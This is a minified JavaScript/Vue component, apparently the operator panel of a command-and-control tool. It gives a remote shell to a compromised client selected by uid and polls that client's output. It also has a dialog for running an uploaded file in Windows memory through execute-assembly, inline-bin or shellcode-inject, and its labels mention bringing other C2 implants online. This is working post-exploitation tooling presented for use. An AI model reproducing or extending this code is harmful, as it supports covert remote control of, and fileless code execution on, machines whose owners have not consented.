import{_ as j}from"./e1619f58.js";/* empty css        *//* empty css        *//* empty css        *//* empty css        *//* empty css        */import{ax as q,aB as L,r as a,d as W,Z,l as V,m as w,p as i,U as S,V as r,a9 as b,P as v,a3 as M,T as I,F as J,a8 as Q,S as X}from"./95bbca75.js";import{C as E}from"./e021e21f.js";import{b as F,y as Y,o as ee,p as te,a as y,w as se,v as ne}from"./431e6e02.js";const le=q("commandHistory",{state:()=>({histories:{},currentIndices:{}}),actions:{addCommand(e,c){c.trim()&&(!this.histories[e]||this.histories[e][this.histories[e].length-1]!==c)&&(this.histories[e]||(this.histories[e]=[]),this.histories[e].push(c),this.currentIndices[e]=-1)},getPrevCommand(e){if(!(!this.histories[e]||this.histories[e].length===0)&&(this.currentIndices[e]===-1&&(this.currentIndices[e]=this.histories[e].length),this.currentIndices[e]>0))return this.currentIndices[e]--,this.histories[e][this.currentIndices[e]]},getNextCommand(e){if(!(!this.histories[e]||this.histories[e].length===0))return this.currentIndices[e]>=0&&this.currentIndices[e]<this.histories[e].length-1?(this.currentIndices[e]++,this.histories[e][this.currentIndices[e]]):(this.currentIndices[e]=-1,"")},clearCurrentIndex(e){this.currentIndices[e]=-1},clearHistory(e){this.histories[e]&&(delete this.histories[e],delete this.currentIndices[e])}}});const oe={class:"terminal-container"},ae={class:"terminal"},ie={id:"output",class:"output"},re={class:"terminal-actions"},ce={class:"dialog-content"},ue={class:"mode-section"},de={class:"file-section"},me={key:0,class:"file-info"},he={class:"param-section"},ve={class:"dialog-footer"},pe={__name:"ClientShell",setup(e){const c=le(),H=L(),u=a(""),f=a(""),p=a(""),d=String(H.query.uid),K=async()=>{if(u.value.trim()==="")return;const s=u.value.trim();u.value="",c.addCommand(d,s),c.clearCurrentIndex(d);try{E.send_commands({uid:d,command:s}).then(t=>{if(p.value=t.data.data,f.value!==p.value){f.value=p.value;const l=document.getElementById("output");setTimeout(()=>{l.scrollTop=l.scrollHeight},1)}})}catch{y.error("命令执行失败")}},N=()=>{const s=c.getPrevCommand(d);s!==void 0&&(u.value=s)},U=()=>{const s=c.getNextCommand(d);s!==void 0&&(u.value=s)};function k(){E.get_shellcontent({uid:d}).then(s=>{if(p.value=s.data.data,f.value!==p.value){f.value=p.value;const t=document.getElementById("output");setTimeout(()=>{t.scrollTop=t.scrollHeight},1)}})}const m=a(!1),_=a(null),o=a(null),g=a(""),C=a(!1),x=a(""),P=[{value:"execute-assembly",label:"Execute Assembly(.net程序内存执行)"},{value:"inline-bin",label:"Inline Bin(其他exe程序内存执行)"},{value:"shellcode-inject",label:"shellcode执行(执行shellcode,上线其他C2等)"}],z=()=>{_.value&&_.value.click()},D=s=>{const t=s.target.files;t&&t.length>0&&(o.value=t[0])},R=s=>{if(s===0)return"0 Bytes";const t=1024,l=["Bytes","KB","MB","GB"],h=Math.floor(Math.log(s)/Math.log(t));return parseFloat((s/Math.pow(t,h)).toFixed(2))+" "+l[h]},A=async()=>{if(!o.value){y.warning("请先选择一个文件！");return}C.value=!0;try{const s=g.value.trim(),t=x.value,l=await E.ExecuteBin({uid:d,mode:t,file:o.value,args:s});l.data.status===200?y.success("后台执行成功"):y.error(l.data.data),m.value=!1,B()}catch(s){console.error("执行过程中出错:",s),y.error(`执行失败: ${s.message||"未知错误"}`)}finally{C.value=!1}},T=()=>{if(C.value){F.confirm("操作正在执行中，确定要关闭吗？","提示",{confirmButtonText:"确定",cancelButtonText:"取消",type:"warning"}).then(()=>{m.value=!1,B()}).catch(()=>{});return}o.value||g.value?F.confirm("关闭将清除已选择的文件和输入的参数，确定要关闭吗？","提示",{confirmButtonText:"确定",cancelButtonText:"取消",type:"warning"}).then(()=>{m.value=!1,B()}).catch(()=>{}):m.value=!1},B=()=>{o.value=null,g.value="",x.value="",_.value&&(_.value.value="")};return W(()=>{k();const s=setInterval(k,5e3);Z(()=>{clearInterval(s)})}),(s,t)=>{const l=Y,h=ee,G=ne,O=se,$=te;return V(),w("div",oe,[i("div",ae,[i("div",ie,S(f.value),1),r(l,{modelValue:u.value,"onUpdate:modelValue":t[0]||(t[0]=n=>u.value=n),placeholder:"输入命令...",onKeyup:b(K,["enter"]),onKeydown:[b(M(N,["prevent"]),["up"]),b(M(U,["prevent"]),["down"])],ref:"input"},null,8,["modelValue","onKeyup","onKeydown"])]),i("div",re,[r(h,{type:"primary",onClick:t[1]||(t[1]=n=>m.value=!0)},{default:v(()=>[I(" Windows内存执行 ")]),_:1})]),r($,{modelValue:m.value,"onUpdate:modelValue":t[4]||(t[4]=n=>m.value=n),title:"内存执行",width:"500px","before-close":T},{footer:v(()=>[i("span",ve,[r(h,{onClick:T},{default:v(()=>[I("取消")]),_:1}),r(h,{type:"primary",onClick:A,disabled:!o.value||C.value},{default:v(()=>[I(" 确定执行 ")]),_:1},8,["disabled"])])]),default:v(()=>[i("div",ce,[i("div",ue,[r(O,{modelValue:x.value,"onUpdate:modelValue":t[2]||(t[2]=n=>x.value=n),placeholder:"选择执行模式",style:{width:"100%"}},{default:v(()=>[(V(),w(J,null,Q(P,n=>r(G,{key:n.value,label:n.label,value:n.value},null,8,["label","value"])),64))]),_:1},8,["modelValue"])]),i("div",de,[r(h,{type:"success",onClick:z},{default:v(()=>[I(" 选择文件 ")]),_:1}),i("input",{type:"file",ref_key:"fileInputRef",ref:_,onChange:D,style:{display:"none"}},null,544),o.value?(V(),w("p",me," 已选择: "+S(o.value.name)+" ("+S(R(o.value.size))+") ",1)):X("",!0)]),i("div",he,[r(l,{modelValue:g.value,"onUpdate:modelValue":t[3]||(t[3]=n=>g.value=n),placeholder:"请输入程序运行参数",clearable:""},null,8,["modelValue"])])])]),_:1},8,["modelValue"])])}}},we=j(pe,[["__scopeId","data-v-dc80faac"]]);export{we as default};
